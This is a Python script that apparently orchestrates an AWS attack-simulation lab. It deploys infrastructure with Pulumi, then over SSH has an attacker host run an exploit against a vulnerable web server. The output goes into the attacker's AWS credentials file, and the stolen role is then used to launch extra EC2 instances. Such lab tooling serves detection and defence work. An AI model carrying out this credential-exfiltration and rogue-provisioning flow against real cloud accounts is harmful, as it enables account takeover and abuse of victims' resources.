import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation

def generate_ssh_key():
    # Define the path to save the keys
    key_path = os.path.expanduser("./id_rsa")

    # Check if SSH key already exists
    if os.path.exists(key_path):
        print("SSH key already exists. Deleting the existing key...")
        os.remove(key_path)

    # Generate the SSH key pair
    with open(os.devnull, 'w') as devnull:
        subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-N", "", "-f", key_path], stdout=devnull, stderr=devnull)
    print("SSH Key Pair generated successfully!")

    return key_path, key_path + ".pub"

def scenario_1_execute():
    print("-"*30)
    print(colored("Executing Scenraio 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
    generate_ssh_key()
    loading_animation()
    print("-"*30)
    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call("pwd", shell=True)
    file_path = "./core/aws-scenario-1-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))
    subprocess.call("cd ./scenarios/scenario_1/infra/ && pulumi up -s aws-scenario-1 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_1/infra/ && pulumi stack -s aws-scenario-1 output --json >> ../../../core/aws-scenario-1-output.json", shell=True)
    
    print("-"*30)
    print(colored("Bringing up the Vulnerable Application", color="red"))
    loading_animation()

    # Use tqdm as a context manager to create the progress bar
    sleep_duration = 300
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        # Loop until sleep_duration is reached
        while sleep_duration > 0:
            # Sleep for a shorter interval to update the progress bar
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            # Update the progress bar with the elapsed time
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    print("-"*30)
    print(colored("Export Meta Data of Infra", color="red"))

    print("-"*30)
    print(colored("Get into the attacker machine - Tor Node", color="red"))
    loading_animation()

    with open("./core/aws-scenario-1-output.json", "r") as file:
        data = json.load(file)

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
    ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
    WEB_SERVER_INSTANCE_ID = data["Web Server Instance ID"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]

    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)

    print("-"*30)
    print(colored("Running exploit on Remote Web Server", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 exploit.py "+WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    print("-"*30)
    print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
    loading_animation()

    print("-"*30)
    print(colored("Role Details", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)

    print("-"*30)
    print(colored("Anomalous Infra Rollout", color="red"))
    loading_animation()
    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" ""aws ec2 run-instances --image-id "+AMI_ID+" --instance-type t2.micro --key-name "+KEY_PAIR_NAME+"  --subnet-id "+SUBNET_ID+" --region ap-south-1 | jq '.Instances[].InstanceId'""", shell=True)

    print("-"*30)
    print(colored("Generating Report", color="red"))
    loading_animation()
    gen_report(ATTACKER_SERVER_INSTANCE_ID, ATTACKER_SERVER_PUBLIC_IP, WEB_SERVER_PUBLIC_IP, WEB_SERVER_INSTANCE_ID)